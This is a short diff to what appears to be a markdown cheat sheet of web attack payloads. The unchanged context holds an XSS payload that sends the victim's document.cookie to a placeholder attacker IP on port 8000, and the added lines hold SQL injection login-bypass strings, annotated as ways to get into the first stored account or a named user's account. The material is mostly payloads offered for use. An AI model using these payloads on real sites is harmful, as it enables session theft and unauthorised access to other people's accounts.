@@ -36,7 +36,11 @@ More stealth, use this one
     <script>i=document.createElement('img');i.src='http://<attacker IP>:8000/'+document.cookie;document.body.appendChild(img)</script>
     
 ### SqlI
+To gain access to the first account saved in the database
+
     a' OR 1=1 --
+To gain access to an account by knowing the username
+    [username]' OR 1=1 --
 
 		
 
